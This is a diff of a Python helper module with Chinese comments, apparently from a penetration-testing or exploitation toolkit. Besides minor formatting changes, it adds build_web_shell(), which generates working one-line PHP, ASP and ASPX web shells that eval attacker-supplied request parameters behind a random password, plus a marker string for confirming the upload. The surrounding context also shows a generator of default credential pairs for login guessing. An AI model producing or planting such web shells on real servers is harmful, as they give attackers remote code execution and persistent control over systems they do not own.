@@ -4,10 +4,10 @@ import json
 import base64 as b64
 import random
 import string
+import uuid
 
 
 def build_random_str(length=8):
-
     """ 随机字符串 """
 
     return ''.join(random.sample(string.ascii_letters, length))
@@ -32,14 +32,12 @@ randomUppercase = build_random_upper_str
 
 
 def build_random_int(min_length=8, max_length=16):
-
     """ 随机整数 """
 
     return random.randint(min_length, max_length)
 
 
 randomInt = build_random_int
-
 
 base64 = b64.b64encode
 
@@ -81,3 +79,20 @@ def build_login_dict(method=1, username='admin', password='admin'):
                 yield username, password
     else:
         raise Exception('login method error!')
+
+
+def build_web_shell(lang='php') -> tuple:
+    """ 生成WebShell """
+    code, password = '', build_random_str(8)
+    if lang == 'php':
+        code = '<?php @eval($_POST["{}"]);?>'.format(password)
+        flag = 'echo "<{}>";die();'.format(password)
+    elif lang == 'asp':
+        code = '<%eval request("{}")%>'.format(password)
+        flag = 'Response.Write("{}")'.format(password)
+    elif lang == 'aspx':
+        code = '<%@ Page Language="Jscript"%><%eval(Request.Item["{}"],"unsafe");%>'.format(password)
+        flag = 'Response.Write("{}")'.format(password)
+    else:
+        raise Exception(f'Unusable language')
+    return code, password, flag
